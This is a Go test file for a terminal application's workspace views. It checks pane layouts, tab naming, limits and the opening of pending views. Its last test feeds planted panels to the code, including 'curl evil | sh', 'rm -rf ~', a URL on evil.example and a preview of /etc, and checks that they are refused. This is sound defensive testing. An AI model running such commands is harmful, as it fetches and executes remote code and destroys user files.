// Copyright 2026, DiamondForge
// SPDX-License-Identifier: Apache-2.0

package wcore

import (
	"encoding/json"
	"testing"

	"github.com/wavetermdev/waveterm/pkg/molten/viewpin"
	"github.com/wavetermdev/waveterm/pkg/waveobj"
	"github.com/wavetermdev/waveterm/pkg/wconfig"
)

func treeJson(t *testing.T, n viewpin.Node) string {
	t.Helper()
	barr, err := json.Marshal(n)
	if err != nil {
		t.Fatalf("marshal tree: %v", err)
	}
	return string(barr)
}

func TestWorkspaceViewConfigAgentLeftGraphicsRight(t *testing.T) {
	cfg, ok := WorkspaceViewConfig([]string{"browser", "agent", "files"})
	if !ok || len(cfg.Panes) != 3 {
		t.Fatalf("config %+v %v", cfg, ok)
	}
	if cfg.Panes[1][viewpin.AgentSlotMetaKey] != true || cfg.Panes[1]["view"] != "term" {
		t.Fatalf("the agent is a terminal agent slot: %v", cfg.Panes[1])
	}
	if cfg.Panes[0]["view"] != "molten-browser" || cfg.Panes[0]["url"] != viewpin.RepoToken {
		t.Fatalf("browser %v", cfg.Panes[0])
	}
	if cfg.Panes[2]["view"] != "preview" || cfg.Panes[2]["file"] != viewpin.ProjectToken {
		t.Fatalf("files %v", cfg.Panes[2])
	}
	want := `{"dir":"row","children":[{"pane":1},{"dir":"column","children":[{"pane":0},{"pane":2}]}]}`
	if got := treeJson(t, cfg.Tree); got != want {
		t.Fatalf("tree %s, want %s", got, want)
	}
}

func TestWorkspaceViewConfigWithoutAgent(t *testing.T) {
	cfg, ok := WorkspaceViewConfig([]string{"project", "nope", "integration"})
	if !ok || len(cfg.Panes) != 2 {
		t.Fatalf("config %+v %v", cfg, ok)
	}
	if cfg.Panes[0]["view"] != "molten-project" || cfg.Panes[1]["view"] != "molten-reviews" {
		t.Fatalf("panes %v", cfg.Panes)
	}
	want := `{"dir":"row","children":[{"pane":0},{"pane":1}]}`
	if got := treeJson(t, cfg.Tree); got != want {
		t.Fatalf("tree %s, want %s", got, want)
	}
	one, _ := WorkspaceViewConfig([]string{"terminal"})
	if got := treeJson(t, one.Tree); got != `{"pane":0}` {
		t.Fatalf("one panel %s", got)
	}
	if _, ok := WorkspaceViewConfig([]string{"nope"}); ok {
		t.Fatalf("a view without a known panel is skipped")
	}
}

func TestWorkspaceViewTabs(t *testing.T) {
	tabs := workspaceViewTabs([]wconfig.NewWorkspaceViewType{
		{NameKey: "workspaceViews.names.scoping", Panels: []string{"agent", "browser", "files"}},
		{Name: "Mine", Panels: []string{"terminal"}},
		{Panels: []string{"cicd"}},
		{Name: "Empty", Panels: []string{"nope"}},
	})
	if len(tabs) != 3 {
		t.Fatalf("tabs %+v", tabs)
	}
	first := tabs[0]
	if first.Name != "workspaceViews.names.scoping" || first.Meta[ViewNameKeyMetaKey] != first.Name {
		t.Fatalf("a key-named view %+v", first)
	}
	if first.Meta[viewpin.PinMetaKey] != viewpin.PinWorkspace || first.Meta[ViewPendingMetaKey] != true {
		t.Fatalf("pinned in the workspace and pending %+v", first.Meta)
	}
	if !viewpin.Pinned(first.Meta, nil) {
		t.Fatalf("the view counts as pinned, so it stays without panels")
	}
	cfg, _ := first.Meta[viewpin.PinConfigMetaKey].(map[string]any)
	if panes, _ := cfg["panes"].([]any); len(panes) != 3 {
		t.Fatalf("stored configuration %v", cfg)
	}
	if tabs[1].Name != "Mine" || tabs[1].Meta[ViewNameKeyMetaKey] != nil {
		t.Fatalf("a typed name stays as typed %+v", tabs[1])
	}
	if tabs[2].Name != DefaultViewNameKey || tabs[2].Meta[ViewNameKeyMetaKey] != DefaultViewNameKey {
		t.Fatalf("a view without a name %+v", tabs[2])
	}
	if len(workspaceViewTabs(nil)) != 0 {
		t.Fatalf("an empty template gives no view")
	}
}

func TestWorkspaceViewTabsLimits(t *testing.T) {
	tabs := workspaceViewTabs([]wconfig.NewWorkspaceViewType{
		{Name: "   ", NameKey: "settings.title", Panels: []string{"terminal"}},
		{Name: "  Spec  ", Panels: []string{"terminal"}},
	})
	if tabs[0].Name != DefaultViewNameKey || tabs[0].Meta[ViewNameKeyMetaKey] != DefaultViewNameKey {
		t.Fatalf("a blank name and a key outside the view names read as the default key: %+v", tabs[0])
	}
	if tabs[1].Name != "Spec" {
		t.Fatalf("a typed name is trimmed: %q", tabs[1].Name)
	}
	many := make([]wconfig.NewWorkspaceViewType, MaxWorkspaceViews+5)
	for i := range many {
		many[i] = wconfig.NewWorkspaceViewType{Panels: []string{"terminal", "terminal", "terminal", "terminal", "terminal", "terminal", "terminal", "terminal", "terminal", "terminal"}}
	}
	tabs = workspaceViewTabs(many)
	if len(tabs) != MaxWorkspaceViews {
		t.Fatalf("views capped: %d", len(tabs))
	}
	cfg, _ := WorkspaceViewConfig(many[0].Panels)
	if len(cfg.Panes) != MaxWorkspaceViewPanes {
		t.Fatalf("panels capped: %d", len(cfg.Panes))
	}
}

func pendingTab(t *testing.T, panels []string) *waveobj.Tab {
	t.Helper()
	tabs := workspaceViewTabs([]wconfig.NewWorkspaceViewType{{NameKey: "workspaceViews.names.scoping", Panels: panels}})
	return &waveobj.Tab{OID: "t", Name: tabs[0].Name, Meta: tabs[0].Meta}
}

func TestPendingViewConfig(t *testing.T) {
	tab := pendingTab(t, []string{"agent", "browser", "files"})
	cfg, build := pendingViewConfig(tab)
	if !build || len(cfg.Panes) != 3 {
		t.Fatalf("a template view opens: %+v %v", cfg, build)
	}
	built := pendingTab(t, []string{"terminal"})
	built.BlockIds = []string{"b1"}
	if _, build := pendingViewConfig(built); build {
		t.Fatalf("a view with panels is not opened again")
	}
	done := pendingTab(t, []string{"terminal"})
	delete(done.Meta, ViewPendingMetaKey)
	if _, build := pendingViewConfig(done); build {
		t.Fatalf("a view no longer pending is not opened")
	}
	unpinned := pendingTab(t, []string{"terminal"})
	delete(unpinned.Meta, viewpin.PinMetaKey)
	if _, build := pendingViewConfig(unpinned); build {
		t.Fatalf("only a view pinned in its workspace opens on its own")
	}
}

// #1305 review: tab meta is writable from a terminal, and a pending view opens without a click.
func TestPendingViewConfigRefusesPlantedPanels(t *testing.T) {
	planted := []map[string]any{
		{"view": "term", "controller": "cmd", "cmd": "curl evil | sh", "cmd:runonstart": true},
		{"view": "term", "controller": "shell", "cmd:initscript": "rm -rf ~"},
		{"view": "molten-browser", "url": "https://evil.example"},
		{"view": "preview", "file": "/etc"},
	}
	for _, pane := range planted {
		tab := pendingTab(t, []string{"terminal"})
		tab.Meta[viewpin.PinConfigMetaKey] = map[string]any{"tree": map[string]any{"pane": 0}, "panes": []any{pane}}
		if _, build := pendingViewConfig(tab); build {
			t.Fatalf("a planted panel opened: %v", pane)
		}
	}
}
